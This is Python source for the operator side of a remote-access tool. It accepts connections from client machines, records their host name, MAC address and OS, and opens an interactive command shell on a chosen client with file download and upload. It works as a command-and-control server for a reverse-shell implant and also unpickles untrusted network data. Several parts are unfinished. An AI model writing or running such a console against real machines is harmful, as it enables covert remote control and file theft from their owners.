import socket
from _thread import *
import time
import pickle
import json
import os

isOn = False
shellON = False
host = '0.0.0.0'
port = 2021
buffer = 2048
clients_ID_list = []
clientIDSessionDict= {}
sessionObject_client_list= []

class clientSession:

    def __init__(self,fromClient_Connection, clientID, clientHostName, clientMacAddress, clientOS):
        self.fromClient_Connection = fromClient_Connection
        self.clientID = clientID
        self.clientHostName = clientHostName
        self.clientMacAddress = clientMacAddress
        self.clientOS = clientOS
        # self.clientListDir = clientListDir

    def addTODict(self):
        clientIDSessionDict[self.clientID] = self
        string = "ID- " + str(self.clientID) + ", Session is " + str(clientIDSessionDict[self.clientID])
        return string

    def getSessionByID(self, requierd_clientID):
        global sessionObject_client_list
        global clients_ID_list

        print("Getting session for the ID --> ", requierd_clientID)
        # print(total_client_list)
        sessionObject = clientIDSessionDict[requierd_clientID]
        isExist = False

        return sessionObject

    def backgroundClientAliveCheck(self):
        messageToClient = "pwd"
        # for ID, sessionObject in sessionObject_client_list:
        self.send(messageToClient.encode())


    def shell(self):
        shellON = True
        while shellON:
            message = input('Shell--> ')

            if 'exit' in message:
                self.fromClient_Connection.send(message.encode())
                self.fromClient_Connection.recv(buffer).decode()
                shellON = False
                # start_new_thread(mainMenu())

            elif message == '':
                self.fromClient_Connection.send(message.encode())
            elif 'download' in message:
                self.transfer(message)
                # TODO inComplet

            elif 'upload' in message:
                self.upload(message)


            else:
                try:
                    self.fromClient_Connection.send(message.encode())
                    print(self.fromClient_Connection.recv(buffer).decode())
                except Exception as e:
                    print(str(e))

    def transfer(self, message):

        self.fromClient_Connection.send(message.encode())
        download, path = message.split(' ')

        fileName = os.path.basename(path)
        destPath = r'C:\Users\NaoRaz\Downloads\Test\\'
        print("Saving file at: ", destPath + fileName)
        f = open(destPath + fileName, 'wb')

        while True:
            packet = self.fromClient_Connection.recv(buffer)
            print(packet)

            if b'File Does not exist' in packet:
                print("File Does not exist")
                break

            elif packet.endswith(b"Download Completed"):
                print("Transfer Completed")
                break

            f.write(packet)
        f.close()

    def upload(self, message):
        try:
            self.fromClient_Connection.send(message.encode())
            clientConfirmUpload =  self.fromClient_Connection.recv(buffer).decode()
            dropUpload, path = message.split(' ', 1)
            f = open(path, 'rb')
            packet = f.read(buffer)
            while packet:
                print(packet)
                self.fromClient_Connection.send(packet)
                packet = f.read(buffer)
            time.sleep(3)
            self.fromClient_Connection.send(b"Upload Completed")

        except Exception as e:
            print(str(e))



    def checkClientAlive(self, requierd_clientID):

        try:
            print("Checking if Client is Alive")
            self.fromClient_Connection.send('pwd'.encode())
            res = self.fromClient_Connection.recv(buffer).decode()
            time.sleep(1)
            return True

        except Exception:

            print("Client connection", requierd_clientID, "is DEAD")
            self.disconnectDeadClient(requierd_clientID)


            return False

    def disconnectDeadClient(self, requierd_clientID):

        print("Removeing ", requierd_clientID)
        wantedSessionObject = clientIDSessionDict[requierd_clientID]
        wantedSessionObject.fromClient_Connection.close()
        del clientIDSessionDict[requierd_clientID]
        time.sleep(1)


        for clientID in clients_ID_list:
            if clientID == requierd_clientID:
                clients_ID_list.remove(clientID)

        print("Client Remove Completed")

def startServer():
    global isOn
    global serverSocket
    print(
        "# # # # # # # # # # # # # # " + "\n Initiating Server..." + "\n---------------------")

    serverSocket = socket.socket()
    serverSocket.bind((host, port))
    serverSocket.listen(5)
    print("Server Socket is listening" + "\n# # # # # # # # # # # # # #\n")

    isOn = True
    print("--- Server is UP ---"+"\n\n\n")

def initBackgroundCheck():

    # for ID, sessionObject in sessionObject_client_list:
    #     sessionObject.backgroundClientAliveCheck()
        # if retun delete ID from list

    # dict = clientIDSessionDict.copy()
    for ID, sessionObject in sessionObject_client_list:
        print (ID)
        clientSession = clientIDSessionDict[ID]

        try:
            clientSession.fromClient_Connection.send('pwd'.encode())
            res = clientSession.fromClient_Connection.recv(buffer).decode()

        except Exception:

            clientSession.fromClient_Connection.close()
            del clientIDSessionDict[ID]

def sendToAllClients():
    print ("Send To all clients -->>")
    #TODO send To All Clients

def client_ID_Menu():

    try:
        print("\n----Client ID list----\n", clients_ID_list)

        requierd_clientID = input("Choose ID ->>")
        wantedSessionObject = clientIDSessionDict[requierd_clientID]
        isClientAlive = wantedSessionObject.checkClientAlive(requierd_clientID)

        if isClientAlive:
            wantedSessionObject.shell()
            return False

        else:
            return False

    except Exception as e:
        print(str(e))
        return e

def connect():

    ''' Receiving Json from Client in connection  '''
    global ClientNewList


    fromClient_Connection, fromClient_Address = serverSocket.accept()

    print("======================================================================================================"
          "=====================================================================")
    print("Connection from -> ",fromClient_Address, "\nReciving Client Info ")


    firstDataClientBytes = fromClient_Connection.recv(buffer)
    firstDataClient = pickle.loads(firstDataClientBytes)

    clientInfoJson = json.loads(firstDataClient)
    clientInfoJson = clientInfoJson.replace("\'", "\"")
    clientInfoJson = json.loads(clientInfoJson)


    clientID = clientInfoJson['ID']
    clientHostName = clientInfoJson['host name']
    clientMacAddress = clientInfoJson['mac address']
    clientOS = clientInfoJson['OS version']
    #TODO clientListDir = clientInfoJson["current dir list"]

    print("------ Creating Session for client ------ \n---------------------------------------------------------"
          "---------------------------------------------------------------------\n"
          , clientInfoJson)

    print("------------------------------------------------------------------------------------------------------------------------------")

    newSessionObject = createClientSessionObject(fromClient_Connection, clientID, clientHostName, clientMacAddress, clientOS)

    print("======================================================================================================"
          "======================================================================")

    addTODict= newSessionObject.addTODict()
    print(addTODict)
    return Exception


def createClientSessionObject(fromClient_Connection, clientID, clientHostName, clientMacAddress, clientOS):
    global clients_ID_list
    global sessionObject_client_list

    # TODO add clientListDir value to the json
    sessionObject = clientSession(fromClient_Connection, clientID, clientHostName, clientMacAddress, clientOS)
    sessionObject_client_list.append(sessionObject)
    clients_ID_list.append(sessionObject.clientID)
    print("Session Created")

    return sessionObject

def menuChoise ():

    user_choise = input("Answer with number -> ")

    if " " in user_choise:
        print("Invalid answer, please try again")
        # inputFailerCount += 1

    elif user_choise == str(1):
        sendToAllClients()


    elif user_choise == str(2):

        try:
            # print("before!!!!")
            client_ID_Menu()
        except Exception:
            pass

def menuOptions():
    print("#######\n Main Menu \n#######",
      "\n1.Send to all existed clients",
      "\n2.Send to a specific client\n")

    menuChoise()
def mainMenu():

    start_new_thread(connect, ())
    # start_new_thread(initBackgroundCheck,())

    if clients_ID_list == []:

        return Exception

    menuOptions()


def main():
    global isOn
    global serverSocket

    while True:
        if not isOn:
            startServer()
        else:
            try:
                mainMenu()

            except Exception as e:
                pass


if __name__ == '__main__':
    main()
